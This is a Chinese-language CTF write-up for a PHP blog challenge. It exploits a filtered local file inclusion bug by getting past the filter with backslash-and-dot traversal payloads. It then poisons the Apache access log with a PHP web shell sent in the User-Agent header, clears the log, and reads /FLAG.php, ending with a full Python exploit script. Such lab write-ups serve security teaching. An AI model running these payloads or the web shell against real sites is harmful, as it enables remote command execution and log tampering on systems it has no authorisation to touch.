# X-079-24
## 题目描述

> You've discovered a personal blog site that initially had a serious security oversight with an LFI vulnerability. However, the developer has detected the intrusion and implemented new protections to secure the site. Your mission is to bypass these new defenses, exploit the LFI vulnerability, and uncover the hidden flag at /FLAG.php

## 知识点

PHP 本地文件包含（LFI）

## 解题思路

1) 入口探测：
- 访问 `/post.php?id=已知存在的文章文件` 正常展示；改成不存在的值则提示“Post not found”。据此确定 `id` 影响服务器侧的文件读取/包含逻辑。

2) 穿越 FUZZ：
- 对 `id` 枚举常见穿越负载：`../../..`、`..//..//`、双重编码 `%252e%252e%252f`、反斜杠 `\` 与斜杠 `/` 混用等。
- 实测发现以下模式可以穿透过滤并命中日志文件（页面直接输出日志文本而非文章模板）：
  - `id=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log`
  - 其中 `....%5C/` 为“四个点 + 反斜杠（%5C）+ 正斜杠（/）”，重复 4 次后再拼接日志路径。
  - 命中后，页面会出现 access.log 的内容，确认 LFI 成功。

3) 日志投毒拿 RCE：
- 对首页（或任意可被记录的路径）发送请求，设置 Header `User-Agent: <?php system($_GET['cmd']); ?>`，该字符串会被写入 access.log。
- 再次用上面的 LFI 负载包含 access.log，并加上 `&cmd=echo PWNED`，若页面出现 PWNED 则证明命令执行成功。

## 解题步骤

1) 浏览首页，确认文章详情使用 `post.php?id=...` 参数；记一篇存在的 id 用于对照。

2) 向首页发“日志投毒”请求（写入恶意 UA）：
- `User-Agent: <?php system($_GET['cmd']); ?>`

3) 验证 LFI + RCE：
- 访问：`/post.php?id=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log&cmd=id`
- 页面若出现 `uid=` 字样，则 RCE 成功。

4) 清空日志并读取 flag（保证回显可见）：
- 清空：`/post.php?id=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log&cmd=%3E%20/var/log/apache2/access.log`
- 再投毒一次（同第 2 步 UA）。
- 读取：`/post.php?id=....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log&cmd=cat%20/FLAG.php`
![image.png](https://x/x12142803068.png)
## EXP
```python
import requests
import re

base = "http://ip32841"
sess = requests.Session()

log_lfi = "....%5C/....%5C/....%5C/....%5C/var/log/apache2/access.log"

# 1) 首次投毒（写入 <?php ... ?> 到 access.log）
ua = "<?php system($_GET['cmd']); ?>"
sess.get(base + "/", headers={"User-Agent": ua}, timeout=8)

# 2) 通过包含日志执行清空操作
sess.get(f"{base}/post.php?id={log_lfi}&cmd=%3E%20/var/log/apache2/access.log", timeout=8)

# 3) 再次投毒
sess.get(base + "/", headers={"User-Agent": ua}, timeout=8)

# 4) 通过包含日志执行读取 FLAG
r = sess.get(f"{base}/post.php?id={log_lfi}&cmd=cat%20/FLAG.php", timeout=8)
m = re.search(r"FLAG\{[^}]+\}", r.text)
if m:
    print("[+] FLAG:", m.group(0))

```